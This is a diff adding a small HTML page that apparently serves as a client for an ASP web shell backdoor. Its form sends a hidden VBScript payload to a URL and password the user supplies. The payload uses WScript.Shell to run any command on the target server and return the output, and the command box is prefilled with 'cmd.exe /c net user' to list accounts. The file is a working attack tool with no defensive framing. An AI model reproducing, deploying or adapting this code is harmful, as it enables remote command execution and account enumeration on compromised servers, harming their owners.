@@ -1,0 +1,18 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">Execute Command</div>
+<form name="xform" method="post" target="_blank">
+<table width="100%"  border="0" align="center">
+<tr>
+<td width="22%">Path and Command:</td>
+<td width="78%"><input name="cmd_cmd" type="text" value="cmd.exe /c net user" size="50"></td>
+</tr>
+<input type="hidden" name="code" value='execute("response.clear:set CMDShell=Server.CreateObject(""WScript.Shell""):StrResult=CMDShell.eXec(request(""cmd_cmd"")).stdout.readall:StrResult=Replace(StrResult,""<"",""&lt;""):StrResult=Replace(StrResult,"">"",""&gt;""):StrResult=""<pre>""&StrResult&""</pre>"":Response.write(StrResult):response.end")'>
+</table>
+</form>
+<script>
+function RUNonclick(){
+document.xform.code.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
